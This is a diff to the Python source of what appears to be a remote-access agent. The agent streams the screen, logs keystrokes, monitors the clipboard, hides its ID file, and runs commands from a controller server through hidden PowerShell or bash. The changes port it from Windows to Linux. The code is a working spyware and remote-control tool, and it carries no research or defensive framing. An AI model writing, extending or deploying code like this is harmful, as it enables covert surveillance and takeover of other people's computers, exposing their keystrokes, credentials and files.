@@ -7,19 +7,24 @@ import threading
 import mss
 import numpy as np
 import cv2
-import win32api
-import win32con
+try:
+    import win32api
+    import win32con
+    import win32clipboard
+    WINDOWS_AVAILABLE = True
+except ImportError:
+    WINDOWS_AVAILABLE = False
+    
 import pyaudio
 import base64
 import tempfile
-import win32clipboard
 import pynput
 from pynput import keyboard
 import pygame
 import io
 import wave
 
-SERVER_URL = "http://192.168.100.239:8080"  # Change to your controller's URL
+SERVER_URL = "http://localhost:8080"  # Change to your controller's URL
 
 # --- Agent State ---
 STREAMING_ENABLED = False
@@ -46,10 +51,15 @@ RATE = 44100
 
 def get_or_create_agent_id():
     """
-    Gets a unique agent ID from %APPDATA%\agent_id.txt or creates it.
+    Gets a unique agent ID from config directory or creates it.
     """
-    appdata_path = os.getenv('APPDATA')
-    id_file_path = os.path.join(appdata_path, 'agent_id.txt')
+    if WINDOWS_AVAILABLE:
+        config_path = os.getenv('APPDATA')
+    else:
+        config_path = os.path.expanduser('~/.config')
+        
+    os.makedirs(config_path, exist_ok=True)
+    id_file_path = os.path.join(config_path, 'agent_id.txt')
     
     if os.path.exists(id_file_path):
         with open(id_file_path, 'r') as f:
@@ -58,8 +68,12 @@ def get_or_create_agent_id():
         agent_id = str(uuid.uuid4())
         with open(id_file_path, 'w') as f:
             f.write(agent_id)
-        # Hide the file
-        win32api.SetFileAttributes(id_file_path, win32con.FILE_ATTRIBUTE_HIDDEN)
+        # Hide the file on Windows
+        if WINDOWS_AVAILABLE:
+            try:
+                win32api.SetFileAttributes(id_file_path, win32con.FILE_ATTRIBUTE_HIDDEN)
+            except:
+                pass
         return agent_id
 
 def stream_screen(agent_id):
@@ -282,16 +296,20 @@ def stop_keylogger():
 
 def get_clipboard_content():
     """Get current clipboard content."""
-    try:
-        win32clipboard.OpenClipboard()
-        data = win32clipboard.GetClipboardData()
-        win32clipboard.CloseClipboard()
-        return data
-    except:
+    if WINDOWS_AVAILABLE:
         try:
+            win32clipboard.OpenClipboard()
+            data = win32clipboard.GetClipboardData()
             win32clipboard.CloseClipboard()
+            return data
         except:
-            pass
+            try:
+                win32clipboard.CloseClipboard()
+            except:
+                pass
+            return None
+    else:
+        # On Linux, we'll skip clipboard monitoring for now
         return None
 
 def clipboard_monitor_worker(agent_id):
@@ -421,17 +439,23 @@ def handle_voice_playback(command_parts):
 def execute_command(command):
     """Executes a command and returns its output."""
     try:
-        # Explicitly use PowerShell to execute commands. This allows PowerShell-specific
-        # cmdlets and aliases like 'ls' to work correctly.
-        # -NoProfile makes execution faster and more predictable.
-        # We pass the command as a list to avoid shell injection vulnerabilities.
-        result = subprocess.run(
-            ["powershell.exe", "-NoProfile", "-Command", command],
-            capture_output=True,
-            text=True,
-            timeout=30,
-            creationflags=subprocess.CREATE_NO_WINDOW
-        )
+        if WINDOWS_AVAILABLE:
+            # Explicitly use PowerShell to execute commands on Windows
+            result = subprocess.run(
+                ["powershell.exe", "-NoProfile", "-Command", command],
+                capture_output=True,
+                text=True,
+                timeout=30,
+                creationflags=subprocess.CREATE_NO_WINDOW
+            )
+        else:
+            # Use bash on Linux/Unix systems
+            result = subprocess.run(
+                ["bash", "-c", command],
+                capture_output=True,
+                text=True,
+                timeout=30
+            )
         output = result.stdout + result.stderr
         if not output:
             return "[No output from command]"
